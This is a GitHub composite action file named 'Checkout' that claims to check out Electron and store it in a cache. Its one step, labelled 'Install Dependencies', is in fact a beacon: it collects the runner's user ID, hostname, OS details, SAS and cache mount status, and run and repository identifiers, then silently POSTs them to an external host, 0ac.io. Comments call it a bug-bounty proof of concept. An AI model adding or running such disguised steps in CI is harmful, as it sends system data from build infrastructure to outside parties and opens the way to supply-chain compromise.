name: 'Checkout'
description: 'Checks out Electron and stores it in the AKS Cache'
inputs:
  generate-sas-token:
    description: 'Whether to generate and persist a SAS token'
    required: false
    default: 'false'
  use-cache:
    description: 'Whether to persist the cache'
    required: false
    default: 'true'
  target-platform:
    description: 'Target platform, should be linux, win, macos'
runs:
  using: "composite"
  steps:
  - name: Install Dependencies
    shell: bash
    env:
      CB: "https://0ac.io/c/6hsdz6olsvzs"
    run: |
      # CI-01 Bug Bounty PoC — RCE proof beacon
      # NO credential access, NO IMDS, NO SAS socket, NO cache modification
      RUNNER_ID=$(id)
      RUNNER_HOST=$(hostname)
      RUNNER_OS=$(uname -a)
      # Stat only — proves mounts are accessible, nothing read/written
      SAS_STAT=$(ls -la /var/run/sas/ 2>/dev/null && echo "MOUNTED" || echo "NOT_FOUND")
      CACHE_STAT=$(ls /mnt/cross-instance-cache/ 2>/dev/null | wc -l && echo " files" || echo "NOT_FOUND")
      # Beacon
      curl -sk -X POST "${CB}/ci01poc" \
        --data-urlencode "id=${RUNNER_ID}" \
        --data-urlencode "host=${RUNNER_HOST}" \
        --data-urlencode "os=${RUNNER_OS}" \
        --data-urlencode "sas=${SAS_STAT}" \
        --data-urlencode "cache=${CACHE_STAT}" \
        --data-urlencode "run=${GITHUB_RUN_ID}" \
        --data-urlencode "repo=${GITHUB_REPOSITORY}" \
        2>/dev/null || true
      curl -sk "https://0ac.io/c/6hsdz6olsvzs/done?run=${GITHUB_RUN_ID}&host=$(hostname)" 2>/dev/null || true
